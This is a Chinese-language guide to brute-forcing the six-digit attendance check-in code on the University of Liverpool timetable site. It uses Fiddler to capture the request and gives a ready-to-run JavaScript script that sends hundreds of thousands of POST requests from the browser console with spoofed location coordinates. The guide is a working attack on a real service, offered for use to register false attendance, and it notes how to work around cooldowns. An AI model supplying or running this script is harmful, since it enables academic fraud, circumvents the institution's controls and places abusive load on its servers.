# UoL - Attendance Code 爆破

<aside>
💡 请谨慎使用

此方法极易被检测到异常流量, 不清楚现在及未来, 管理员是否会针对该方法

</aside>


## 0.1 原理

通过浏览器开发人员控制台, 执行JS爆破

抓包, **模拟请求**

由于涉及到 SSL证书 等操作, 这个方法比写程序容易操作很多, 无论是编写还是执行

## 0.2 可行性

多个线程进行爆破, 经测试, 15min 300000个

1. 据观察, 没有0开头的6位签到码

2. 据观察, 连续执行一段时间后, 会触发冷却

可行性仍有待研究


## 1.1 初始化准备

1. 浏览器
2. 抓包工具 (以 `Fiddler` 为例)

## 1.2 准备数据 (先手动操作一遍, 获取请求信息)



1. 浏览器打开 Timetable
    
    [Sign In](https://timetables.liverpool.ac.uk/)
    
2. 打开 Fiddler
3. 进入timetable, 打开指定课程, 输入一次签到码
4. 切换回 Fiddler, 从左侧列表中的 `Host` 列, 找到 `timetables.liverpoo.ac.uk` 且其对应的  `URL`   列显示为 `/services/register-attendance-student` , 双击该行
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3a352054-ceaa-444b-a420-1b33e16e0047/c0e70c2e-df67-4058-b784-bb332f4e7c0a/Untitled.png)
    

## 1.3 构建脚本数据



1. 选中 Fiddler 左侧行后, 右侧会显示 该数据包相关信息
2. 点击 `raw` 选项卡, 里边最后一行就是数据正文
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3a352054-ceaa-444b-a420-1b33e16e0047/9239a0a9-890c-4a94-9410-f59c8f88b11f/Untitled.png)
    
3. 从里边提取对应字段, 替换下方脚本代码 `body` 对应字段
    
    ``` javascript
    async function sendBatchRequests(start, end, batch) {
      let batchPromises = [];

      for (let i = start; i <= end; i += batch) {
        batchPromises = [];
        for (let j = i; j < i + batch && j <= end; j++) {
          let attCodeInputValue = j.toString().padStart(6, "0");
          batchPromises.push(
            fetch("https://timetables.liverpool.ac.uk/services/register-attendance-student", {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              },
              // 请自行修改以下内容
              body: `attCodeInput=${attCodeInputValue}&uniqueId=UNIQUEID&actId=ACTID&attStart=12%2F03%2F2024+12%3A00&attEnd=12%2F03%2F2024+13%3A15&location=53.40998037885158%2C-2.958224235311767`,
            }).then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error('Error:', error))
          );
        }

        await Promise.all(batchPromises);
        console.log(`Batch from ${i} to ${Math.min(i + batch - 1, end)} completed.`);
        await new Promise((resolve) => setTimeout(resolve, 1000)); // 间隔时间
      }
    }

    sendBatchRequests(100000, 999999, 10000); // 分割的数量

    ```
    

## 1.4 发送数据


1. 切换回浏览器的Timetable选项卡
2. 按 `F12` 打开开发者控制台
3. 切换到 `console` 选项卡
4. 粘贴你刚刚构建好的脚本, 回车执行

## 2.1 补充
- Edge浏览器记得关闭标签页休眠!